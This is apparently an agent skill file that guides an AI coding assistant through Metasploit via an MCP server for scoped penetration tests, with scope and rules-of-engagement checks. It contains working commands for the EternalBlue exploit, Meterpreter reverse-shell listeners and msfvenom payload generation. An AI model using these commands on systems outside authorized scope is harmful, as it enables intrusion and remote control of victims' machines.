---
name: msf-harness
description: >-
  Master guide for using the Metasploit Cursor Harness MCP server. Use when
  starting an engagement, choosing between MCP and shell, setting up ROE, or
  understanding the tool surface. Read this first before any Metasploit work.
---

# Metasploit Cursor Harness

## When to Use MCP vs Shell

**Always use MCP for:**
- Module search and info (`msf_search_modules`, `msf_module_info`)
- Database queries (hosts, services, vulns, creds, loot, notes)
- Exploit execution (`msf_run_exploit`), auxiliary modules, post modules
- Session management (list, command, terminate, upgrade)
- Handler/listener management
- Payload generation and workspace management

**Fall back to shell only for:**
- Interactive msfconsole workflows with complex multi-step resource scripts
- Operations not yet exposed in the MCP

## Engagement Setup

1. Read `.cursor/skills/pentest-workflow/SKILL.md` and check phase state
2. Verify scope file exists: `scope/scope-master.txt` (one CIDR per line)
3. Create or select engagement: `engagements/{engagement_id}/roe.yaml`
4. Confirm `engagements/{engagement_id}/phase-state.yaml` exists
5. Run gate check: `python .cursor/skills/pentest-workflow/scripts/gate-check.py {engagement_id}`
6. Start WSL RPC if not running:
```pwsh
.\scripts\start-msfrpcd.ps1
```

### LHOST Resolution (mandatory before reverse payloads)

Resolve LHOST deterministically. Try in this order; use the FIRST that succeeds:

1. `msf_get_lab_network()` -> use `lhost` field from response
2. Read `engagements/{engagement_id}/lhost.yaml` -> use `lhost` value
3. STOP and ask user for LHOST IP

NEVER hardcode an IP. NEVER use `0.0.0.0`. NEVER guess.

### Verify RPC connectivity

**MSF MCP (preferred):**
```text
msf_status()
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -x 'version; exit'"
curl -s http://127.0.0.1:55553/ 2>/dev/null || echo "RPC port check only"
```

## Domain skills

Load the domain skill before improvising techniques. Router: `pentest-knowledge-base`.

| Scope signal | Skill |
|--------------|-------|
| Web application | `web-app-pentest` |
| Active Directory | `internal-ad-pentest` |
| Windows host | `windows-pentest` |
| Open port/service | `hacktricks-methodology` |
| Database access | `database-pentest` |
| AWS/Azure/cloud | `cloud-pentest` |
| Docker/K8s/CI-CD | `container-devops-pentest` |
| Mobile app | `mobile-pentest` |
| macOS host/session | `macos-pentest` |
| Linux host/session | `linux-pentest` |
| LLM/chatbot/MCP | `ai-llm-pentest` |
| Binary exploit (ROE) | `binary-exploit-pentest` |
| Cheatsheets/methodology | `methodology-cheatsheets` |
| MSF exploit chain | `msf-exploit-chain` |
| Post-ex MCP workflow | `msf-post` |

## Tool Reference (54 tools)

### Read-Only (no engagement_id needed)

| Tool | Purpose |
|------|---------|
| `msf_status` | RPC connectivity and version check |
| `msf_search_modules` | Search by keyword, CVE, module name |
| `msf_module_info` | Detailed module options, targets, references |
| `msf_host_info` | Discovered hosts from msfdb |
| `msf_service_info` | Discovered services |
| `msf_vulnerability_info` | Known vulns |
| `msf_note_info` | Database notes |
| `msf_credential_info` | Harvested credentials |
| `msf_loot_info` | Collected loot |
| `msf_list_active_sessions` | Current sessions |
| `msf_list_listeners` | Active handlers/jobs |
| `msf_list_payloads` | Search available payloads |
| `msf_compatible_payloads` | List payloads compatible with a module |
| `msf_get_lab_network` | Get lab target configuration |
| `msf_list_workspaces` | List database workspaces |
| `msf_console_list` | List active RPC console instances |
| `msf_route_list` | List active routes for pivoting |

### Action (engagement_id required)

| Tool | Purpose |
|------|---------|
| `msf_module_check` | Safe vulnerability probe |
| `msf_run_exploit` | Execute exploit (`run_as_job`, `timeout`) |
| `msf_run_auxiliary_module` | Run auxiliary (scanner, etc.; `run_as_job`) |
| `msf_run_post_module` | Post-exploitation module (`run_as_job`) |
| `msf_send_session_command` | Interact with session |
| `msf_terminate_session` | Kill session |
| `msf_wait_for_session` | Poll for new sessions after exploit |
| `msf_session_upgrade` | Upgrade shell to Meterpreter |
| `msf_start_listener` | Create multi/handler |
| `msf_stop_job` | Stop handler/job |
| `msf_cleanup_jobs` | Remove orphaned background jobs |
| `msf_generate_payload` | Generate payload file |
| `msf_create_workspace` | Create database workspace |
| `msf_set_workspace` | Switch active workspace |
| `msf_db_import` | Import scan data (nmap XML, Nessus, etc.) |
| `msf_db_nmap` | Run nmap and auto-import results |
| `msf_console_execute` | Run raw msfconsole command via RPC |

#### Meterpreter session tools

| Tool | Purpose |
|------|---------|
| `msf_session_sysinfo` | Get OS/arch/hostname from Meterpreter session |
| `msf_session_getuid` | Get current user identity from Meterpreter session |
| `msf_session_ps` | List running processes in Meterpreter session |
| `msf_session_download` | Download file from target to evidence/ |
| `msf_session_upload` | Upload file from evidence/ to target |

#### Route / pivot tools

| Tool | Purpose |
|------|---------|
| `msf_route_add` | Add route through session for pivoting |
| `msf_route_delete` | Remove a route |
| `msf_autoroute` | Auto-add routes via post/multi/manage/autoroute |

#### Database write tools

| Tool | Purpose |
|------|---------|
| `msf_report_host` | Manually report host to database |
| `msf_credential_add` | Store discovered credential in database |

## Module Path Convention

The MCP server auto-normalizes module paths. Both forms are accepted:
- Full: `auxiliary/scanner/smb/smb_version`
- Short: `scanner/smb/smb_version`

Skill examples use the full prefix for clarity. Exploit paths omit the `exploit/` prefix by convention (e.g., `windows/smb/ms17_010_eternalblue`).

## Dual-Track Key Operations

### Module search

**MSF MCP (preferred):**
```text
msf_search_modules(query="smb remote code execution")
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'search smb rce; exit'"
```

### Vulnerability check

**MSF MCP (preferred):**
```text
msf_module_check(
  engagement_id="<id>",
  module_type="exploit",
  module_name="windows/smb/ms17_010_eternalblue",
  options={"RHOSTS": "<target>"}
)
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; check; exit'"
```

### Run exploit

**MSF MCP (preferred):**
```text
msf_run_exploit(
  engagement_id="<id>",
  module_name="windows/smb/ms17_010_eternalblue",
  options={"RHOSTS": "<target>", "RPORT": 445},
  payload="windows/x64/meterpreter/reverse_tcp",
  payload_options={"LHOST": "{LHOST}", "LPORT": 4444}
)
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT 4444; exploit; exit'"
```

### Start listener

**MSF MCP (preferred):**
```text
msf_start_listener(
  engagement_id="<id>",
  payload="windows/x64/meterpreter/reverse_tcp",
  lhost="{LHOST}",
  lport=4444
)
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT 4444; run -j; exit'"
```

### Import scan data

**MSF MCP (preferred):**
```text
msf_db_import(
  engagement_id="<id>",
  file_path="evidence/msf/nmap-scan.xml"
)
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'db_import evidence/msf/nmap-scan.xml; hosts; exit'"
```

### Run nmap via MSF

**MSF MCP (preferred):**
```text
msf_db_nmap(
  engagement_id="<id>",
  targets="<target>",
  nmap_args="-sV -sC -p 1-1000"
)
```

**CLI fallback:**
```bash
nmap -sV -sC -p 1-1000 <target> -oX evidence/msf/nmap-scan.xml
wsl -e bash -lc "msfconsole -q -x 'db_import evidence/msf/nmap-scan.xml; exit'"
```

### Generate payload

**MSF MCP (preferred):**
```text
msf_generate_payload(
  engagement_id="<id>",
  payload="linux/x64/meterpreter/reverse_tcp",
  format="elf",
  options={"LHOST": "{LHOST}", "LPORT": 4444},
  output_path="evidence/msf/payload.elf"
)
```

**CLI fallback:**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT=4444 -f elf -o evidence/msf/payload.elf
```

### Workspace management

**MSF MCP (preferred):**
```text
msf_create_workspace(
  engagement_id="<id>",
  workspace_name="engagement-<id>"
)
msf_set_workspace(
  engagement_id="<id>",
  workspace_name="engagement-<id>"
)
msf_list_workspaces()
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'workspace -a engagement-<id>; workspace engagement-<id>; workspace; exit'"
```

## Safety Rules

- Every destructive tool requires `engagement_id` for ROE enforcement
- Targets are validated against `scope/scope-master.txt` server-side AND by hooks
- `auxiliary/dos/*` modules are blocked unconditionally
- Always run `msf_module_check` before `msf_run_exploit`
- Evidence goes to `evidence/msf/`
- Never bypass hooks by using raw `msfconsole` for operations the MCP supports

## Related skills

- `msf-recon` - reconnaissance workflow using MCP read tools
- `msf-exploit-chain` - check-then-exploit workflow
- `msf-post` - post-exploitation session management
- `pentest-workflow` - phase/gate orchestration
- `pentest-knowledge-base` - skill routing by scenario
